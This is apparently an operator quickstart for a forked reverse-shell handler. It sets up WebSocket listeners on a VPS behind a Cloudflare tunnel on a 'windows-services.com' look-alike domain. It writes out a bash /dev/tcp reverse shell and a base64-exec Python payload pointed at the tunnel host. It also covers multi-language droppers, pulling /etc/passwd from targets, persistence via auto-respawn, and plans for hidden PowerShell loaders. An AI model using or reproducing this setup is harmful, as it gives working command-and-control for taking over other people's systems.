# Penelope — Operator QUICKSTART

Fast path for a live demo of the `shxve/penelope` fork: plain-WS and WSS
listeners fronted by cloudflared, PolyDrop-delivered reverse shells landing
on those listeners, and the MCP server as a bonus. Every command below is
cross-checked against the actual source.

## TL;DR

- **Same script, everywhere.** `python3 penelope.py` — stdlib only, no
  install, works on the operator box and on the VPS unchanged.
- **Fork additions live behind `--ws` and `--mcp`.** Plain TCP behavior is
  the upstream default.
- **TLS via cloudflared.** Bind Penelope `--ws` on `127.0.0.1:PORT`; a
  Cloudflare tunnel maps `pen*.windows-services.com` to it, terminates TLS,
  and the operator/target sees `wss://`. No cert to manage on the origin.
- **Owner fixes present on `main`:** `tty.setraw` guard (`d9e08e9`) and
  `ssl.SSLWantReadError` retry (`a0b92d7`, `penelope.py:2152`). Both matter
  under cloudflared latency; verify in Troubleshooting if a session ever
  disappears mid-demo.
- **Log everything.** Session logs land in `~/.penelope/sessions/<name>/`
  automatically; disable with `-L`.

## Prerequisites

| | Required | Notes |
|---|---|---|
| Python | 3.6+ | Kali/Ubuntu ship with 3.11+; `python3 --version` |
| OS (operator) | Linux/macOS/FreeBSD | Full PTY, tab completion, F12 escape |
| VPS | Ubuntu 24.04 (`root@38.60.250.105 -p 22`) | Already provisioned: base + `cloudflared` + `python3` |
| Cloudflared | v2025+ | Verified 2026.7.3 on the VPS |
| DNS | `windows-services.com` in Cloudflare | Zone must be under the same Cloudflare account that runs `cloudflared tunnel login` |
| Pip installs | **none** | Zero third-party runtime deps by design |
| Screen or tmux | either | For persistent listener sessions on the VPS |

Optional but recommended for the demo:
- `~/.penelope/peneloperc` on the operator box for default flags — see
  `extras/peneloperc`.
- PolyDrop checkout at `~/dev/PolyDrop` for scripted multi-language droppers
  (Python, PHP, Node.js, Deno, Go, Julia, Crystal, Dart, Tcl, D, V, Bun,
  F#).

## Local smoke test (Kali)

Sanity-check the checkout before flying to the VPS.

```bash
cd ~/dev/penelope

# 1. Bare TCP listener on the loopback
python3 penelope.py -i 127.0.0.1 -p 4444
```

In a second terminal on the same box:

```bash
# 2. Fire a classic bash reverse shell
bash -c 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1'
```

You should see:

```
[+] Got reverse shell from ...
[+] Attaching to session [1]  <F12 to detach>
kali@box:~$ id
uid=1000(kali) gid=1000(kali) ...
```

Press `F12` to return to the Main Menu, then `sessions` and `kill 1`.

**WebSocket smoke test:**

```bash
python3 penelope.py --ws -i 127.0.0.1 -p 8080 -a
```

`-a` prints a paste-ready `python3 -c "..."` one-liner that speaks WS to
this listener. Run it in another shell; a session should land the same way.
Ctrl-C in the listener terminal to stop.

## Deploy to the VPS via cloudflared

**Goal:** two Penelope WS listeners on the VPS, each behind its own
Cloudflare subdomain, both giving `wss://` to the outside world.

- `pen.windows-services.com`      → `http://127.0.0.1:8080` (primary)
- `pen-plain.windows-services.com` → `http://127.0.0.1:8081` (secondary)

The Penelope listeners themselves are plain WS bound to loopback.
Cloudflared terminates TLS at the edge, so nothing on the VPS needs a
certificate.

### 1. Push the script to the VPS

```bash
scp -P 22 ~/dev/penelope/penelope.py root@38.60.250.105:/root/penelope.py
```

(Or `git clone` — `penelope.py` alone is enough; the tool is a single
file.)

### 2. Authenticate cloudflared (one-time)

```bash
ssh -p 22 root@38.60.250.105
cloudflared tunnel login
```

Opens a browser URL — paste into the operator laptop, pick the
`windows-services.com` zone, done. Certificate lands in
`/root/.cloudflared/cert.pem`.

### 3. Create the tunnel

```bash
cloudflared tunnel create penelope-demo
# Prints:  Created tunnel penelope-demo with id <UUID>
# Credentials at /root/.cloudflared/<UUID>.json
```

### 4. Route both subdomains at the tunnel

```bash
cloudflared tunnel route dns penelope-demo pen.windows-services.com
cloudflared tunnel route dns penelope-demo pen-plain.windows-services.com
```

Both are now CNAMEs to `<UUID>.cfargotunnel.com` in the Cloudflare zone.

### 5. Ingress config

```bash
mkdir -p /root/.cloudflared
cat > /root/.cloudflared/config.yml <<'EOF'
tunnel: penelope-demo
credentials-file: /root/.cloudflared/<UUID>.json

ingress:
  - hostname: pen.windows-services.com
    service: http://127.0.0.1:8080
  - hostname: pen-plain.windows-services.com
    service: http://127.0.0.1:8081
  - service: http_status:404
EOF
```

Replace `<UUID>` with the ID printed by step 3.

### 6. Start the tunnel (persistent)

```bash
screen -dmS cfd cloudflared tunnel run penelope-demo
# Verify:
screen -ls
cloudflared tunnel info penelope-demo
```

For a properly hardened deployment, `cloudflared service install` writes a
systemd unit — fine for after the showoff, overkill for the demo.

### 7. Start both Penelope listeners

```bash
# Primary: WS on :8080 → wss://pen.windows-services.com
screen -dmS pen8080 python3 /root/penelope.py --ws -i 127.0.0.1 -p 8080 -a

# Secondary: WS on :8081 → wss://pen-plain.windows-services.com
screen -dmS pen8081 python3 /root/penelope.py --ws -i 127.0.0.1 -p 8081 -a
```

Attach to either with `screen -r pen8080`; detach with `Ctrl-A d`.

### 8. Reachability check from the operator box

```bash
curl -I https://pen.windows-services.com/
# Expected: HTTP/2 400 or 426  (no --ws-backend set → non-WS request rejected)
```

A `4xx` here is success: the tunnel routed you to Penelope's WS listener,
and it refused the plain GET because the request lacked
`Upgrade: websocket`. A `502/503` means the tunnel is up but Penelope isn't
listening on that local port.

## Demo scenarios

### Scenario 1 — Two listeners live at once

**Show:** the fork exposes plain and TLS-terminated WS endpoints
simultaneously.

```bash
# On the VPS, in a fresh SSH shell:
screen -r pen8080   # WS listener on :8080  (behind pen.windows-services.com)
# Ctrl-A d, then:
screen -r pen8081   # WS listener on :8081  (behind pen-plain.windows-services.com)
```

Both should print their `➤ ... → wss://<host>:<port>/` banner and a
`python3 -c "..."` payload from `-a`.

Talking point: same code path, same session semantics — TLS is a
tunnel-layer detail, not a Penelope concern.

### Scenario 2 — Python payload flow (agent generation and reception)

**Show:** how Penelope emits the WS revshell payload and receives it.

1. On the VPS, attach to `pen8080` (`screen -r pen8080`). Copy the
   `python3 -c "import base64;exec(base64.b64decode('...'))"` line printed
   by `-a`. **Important:** the payload embeds the *bind IP* as its
   `Host:` header — the listener bound to `127.0.0.1`, so the payload
   points at `127.0.0.1`. For a target that isn't on the VPS, rewrite
   `HOST` and `HOSTHDR` to `pen.windows-services.com` and `PORT` to `443`
   (cloudflared TLS), and set `USE_TLS = True`. Simplest one-liner to hand
   to a target:

   ```bash
   python3 -c '
   import base64
   src = open("payload.py").read()
   print("python3 -c \"import base64;exec(base64.b64decode(\\\""
         + base64.b64encode(src.encode()).decode() + "\\\"))\"")'
   ```

   where `payload.py` is the raw template
   (`penelope.py` → `WS_PYTHON_REVSHELL_TEMPLATE`, defined at line 3007)
   filled with `HOST="pen.windows-services.com"`, `PORT=443`, `PATH="/"`,
   `HOSTHDR="pen.windows-services.com"`, `USE_TLS=True`.

2. Paste on the target (a Linux VM, Kali, or macOS with `python3`).

3. Penelope banner:

   ```
   [+] Got reverse shell from <edge-ip> ...
   [+] Attaching to session [1]
   $ id
   uid=... gid=...
   ```

Verification: `id` returns real UID on the target; press `F12` to detach;
`sessions` in the menu lists it; `interact 1` reattaches.

### Scenario 3 — PolyDrop delivery, multiple languages, into one Penelope

**Show:** PolyDrop hands the same reverse-shell logic to Penelope in
several languages; one Penelope listener sees them all land.

PolyDrop already ships WebSocket templates at
`~/dev/PolyDrop/templates/ws/` for Python, PHP, Node.js, Deno, Go, Julia,
Crystal, Dart, Tcl, D, V, Bun, F#. Each connects to a Penelope `--ws`
listener with identical RFC 6455 framing.

Render three of them against `wss://pen.windows-services.com/` (adapt to
PolyDrop's own CLI — the templating substitutes `{{LHOST}}`, `{{LPORT}}`,
`{{WS_PATH}}`, `{{WS_HOST}}`, `{{USE_TLS}}`):

- `python.py`  → target host has Python 3
- `nodejs.js`  → target has Node
- `php.php`    → target has PHP 7+

Fire each on a different demo target (Kali VM, Windows box with Node,
macOS with PHP). On the operator/VPS, `screen -r pen8080` shows:

```
[+] Got reverse shell from ...  Session [1]
[+] Got reverse shell from ...  Session [2]
[+] Got reverse shell from ...  Session [3]
```

Detach the current session with `F12`, then in the Main Menu:

```
> sessions
> interact 2
> id
> upload /etc/hosts        # bidirectional file transfer via built-ins
> F12
> download 2 /etc/passwd   # explicit session id
```

Talking point: three different runtimes, one operator surface. This is why
we care about a unified listener rather than netcat + a screen tab per
target.

### Scenario 4 — MCP: Claude Code drives the same sessions

**Show:** the fork's MCP server. Run alongside the WS listener:

```bash
python3 /root/penelope.py --ws -i 127.0.0.1 -p 8080 -a --mcp --mcp-host 127.0.0.1
```

Token and port are persisted to `/root/.penelope/mcp.json` (`0600`) — see
`--help` MCP section. Bind stays on `127.0.0.1`; if a live remote demo of
MCP is needed, tunnel it separately (do **not** expose the MCP port on the
open cloudflared route above).

## Common operations

Main Menu (F12 from any PTY session, `Ctrl-C` from a raw shell, `Ctrl-D`
from a Readline session — Penelope prints which one applies on attach).

| Command | Effect |
|---|---|
| `sessions` | List active sessions with host, user, PID |
| `interact <id>` (`i <id>`) | Reattach to a session |
| `kill <id>` | Kill a session (does **not** kill the listener) |
| `listeners` | Show active listeners |
| `payloads` | Reprint the reverse-shell payload block |
| `download <path>` / `download <id> <path>` | Pull a file/dir from the target |
| `upload <path>` | Push a local file/dir/URL to the target |
| `run <module>` | Fire a helper module (LinPEAS, LSE, meterpreter, traitor, ...) |
| `script <path-or-url>` | Execute a script in-memory on Unix, stream output back |
| `portfwd L <lport>:<rhost>:<rport>` | Local port-forward through the session |
| `spawn` | Ask the target to spawn another shell into the listener |
| `maintain N` | Auto-respawn to keep N sessions per host |
| `help` | Full command reference |

**Where things live (operator box):**

- Session logs: `~/.penelope/sessions/<session-name>/*.log`
- Global log: `~/.penelope/penelope.log`
- Debug log: `~/.penelope/debug.log`
- MCP token/port: `~/.penelope/mcp.json` (`0600`)
- Config: `~/.penelope/peneloperc` (Python; template at
  `extras/peneloperc`)

Disable session logging entirely with `-L`; keep target shell history with
`-H`.

## Troubleshooting

1. **`SSLWantReadError` mid-session over cloudflared.**
   - **Symptom:** long-lived session drops with `SSLWantReadError`.
   - **Cause:** non-blocking TLS socket signals "no data yet" via
     `SSLWantReadError`; older code treated it as a fatal read.
   - **Fix (already committed):** `penelope.py:2152` retries on
     `(BlockingIOError, ssl.SSLWantReadError)`. Confirm the fix is present
     with `grep -n SSLWantReadError penelope.py` — should print exactly
     one line, at 2152. Commit is `a0b92d7`.
   - **If the error still fires:** you're running an older `penelope.py`.
     Re-`scp` from the operator box.

2. **Session hangs / no cursor after resize.**
   - **Symptom:** attach works from a `tmux` window that isn't a real TTY
     (e.g. spawned from cron, systemd, a CI runner), then hangs.
   - **Cause:** `tty.setraw(sys.stdin)` on a non-TTY raises `termios.error`
     and leaves the terminal half-set.
   - **Fix (already committed):** `penelope.py:4502` guards with
     `sys.stdin.isatty()`. Commit is `d9e08e9`.
   - **Workaround if stuck:** `reset` in the operator terminal.

3. **WSS handshake fails from the payload.**
   - **Symptom:** payload exits immediately, no session on the listener.
   - **Causes:** wrong `HOSTHDR` (must match the fronting hostname the
     `--ws-host` regex allows — default accepts anything), wrong `PATH`
     (must match `--ws-path`, default `/`), `USE_TLS=False` against a
     cloudflared endpoint.
   - **Diagnose:** on the VPS `curl -v -H 'Upgrade: websocket'
     -H 'Connection: Upgrade' -H 'Sec-WebSocket-Key: dGhlIHNhbXBsZQ=='
     -H 'Sec-WebSocket-Version: 13' https://pen.windows-services.com/` —
     look for `HTTP/1.1 101` in the response.

4. **`curl -I` returns `502 Bad Gateway` from cloudflared.**
   - **Cause:** the tunnel is up but the origin (`127.0.0.1:8080`) has no
     Penelope listening.
   - **Fix:** `screen -r pen8080`; if the screen is dead, restart:
     `screen -dmS pen8080 python3 /root/penelope.py --ws -i 127.0.0.1 -p 8080 -a`.

5. **`cloudflared` says `no such tunnel`.**
   - **Cause:** DNS route created before the tunnel; or you ran
     `cloudflared tunnel login` on a different account than the one owning
     the DNS zone.
   - **Fix:** `cloudflared tunnel list` — confirm the tunnel exists and the
     ID matches `config.yml`. Re-run `cloudflared tunnel route dns` if
     needed.

6. **`OSError: [Errno 98] Address already in use`.**
   - **Cause:** a previous Penelope screen is still holding the port.
   - **Fix:** `ss -tlnp | grep -E ':(8080|8081)\b'` then
     `screen -X -S pen8080 quit` or `pkill -f 'penelope.py.*-p 8080'`.

7. **Session lands but shell auto-upgrade fails / stays raw.**
   - **Symptom:** prompt reads `raw:` instead of `pty:` on the banner.
   - **Cause:** target lacks `python`, `python3`, `script`, or a suitable
     upgrade binary.
   - **Fix:** manually type `upgrade` in the Main Menu (Penelope will pick
     an available method). If none, work in the raw shell and detach with
     `Ctrl-C` rather than `F12`.

8. **`--ws -a` prints `HOSTHDR = "127.0.0.1"`.**
   - **Cause:** the listener was bound to `127.0.0.1`, so `-a` fills the
     payload with the bind IP — correct for local smoke tests, useless
     for a target that isn't on the VPS.
   - **Fix:** hand-edit the payload to point at `pen.windows-services.com`
     port `443` with `USE_TLS=True` before delivery. See Scenario 2.

9. **Session dies silently after `download <large-file>`.**
   - **Cause:** Penelope buffers transfers per `network_buffer_size`
     (default 32 KiB) — if the target OOMs mid-transfer the socket closes.
   - **Fix:** for huge files, prefer `run linpeas`-style modules (which
     stream) or split the file target-side (`split -b 10M`).

10. **`Got reverse shell from 172.68.x.x` (cloudflare edge IPs).**
    - **Not a bug.** The origin sees cloudflared's edge IP, not the
      target's public IP — no `X-Forwarded-For` on WebSocket by default.
      Talk to the target-side agent to log the real IP if attribution
      matters.

## Roadmap

Owner-tracked items (from operator notes, cross-checked against the fork's
current state). None are in-tree yet.

- **Auto-cert UX for `--ws --tls-cert`.** Today `--ws` needs `--tls-cert`
  + `--tls-key` provided by hand, or a fronting tunnel to terminate TLS.
  Plan: teach `--ws` to generate a self-signed cert on demand and print
  the fingerprint, so a first-run TLS listener is `python3 penelope.py
  --ws --tls` with no cert plumbing.
- **First-class cloudflared tunnel path.** Document (and eventually
  automate) the cloudflared route as the recommended TLS path, so
  operators don't reach for stunnel / nginx by reflex. This QUICKSTART is
  step one; a `--cloudflared` bootstrap that shells out to `cloudflared
  tunnel run --url http://localhost:PORT` for ephemeral URLs is the next
  step.
- **PowerShell agent self-detach.** The current PS revshell parents to the
  invoking process — closing the loader window kills the session. Plan:
  spawn detached (`Start-Process -WindowStyle Hidden`) so the operator can
  hand a target a one-shot loader that survives the loader exiting.
- **Regression tests for the fixed bugs.** `SSLWantReadError` and the
  non-TTY `tty.setraw` guard both shipped without tests
  (`tasks/todo.md` P1.2/P1.3) — first thing to add before touching the
  session-lifecycle code again.
- **CI that actually runs the tests.** `.github/workflows/version-release.yml`
  is release automation only; nothing runs `pytest` in CI
  (`tasks/todo.md` P0.1/P0.2). Prerequisite for trusting `main`.

Upstream `TODO` (in `README.md`, for context): encryption, remote port
forwarding, SOCKS/HTTP proxy, team server, HTTPS/DNS agents.
